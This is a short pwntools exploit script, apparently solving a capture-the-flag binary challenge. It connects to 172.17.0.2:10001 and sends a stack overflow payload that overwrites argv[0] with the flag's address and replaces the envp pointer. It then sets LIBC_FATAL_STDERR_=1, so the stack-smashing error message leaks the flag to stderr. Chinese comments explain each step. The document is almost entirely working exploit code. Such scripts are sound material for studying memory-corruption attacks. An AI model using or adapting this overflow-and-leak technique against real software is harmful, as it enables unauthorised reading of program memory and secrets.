#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(os = 'linux', arch = 'amd64')

flag_addr = 0x400d20
envp_addr = 0x6002d0

io = remote('172.17.0.2', 10001)

payload = ""
payload += "A"*0x218
payload += p64(flag_addr)		#覆盖argv[0]
payload += p64(0)
payload += p64(envp_addr)		#覆盖envp指针

io.recvuntil("What's your name? ")
io.sendline(payload)
io.recvuntil("Please overwrite the flag: ")
io.sendline("LIBC_FATAL_STDERR_=1")			#设置地址0x6002d0的内容为LIBC_FATAL_STDERR_=1，从而引导__libc_message将错误信息输出到stderr
print io.recv()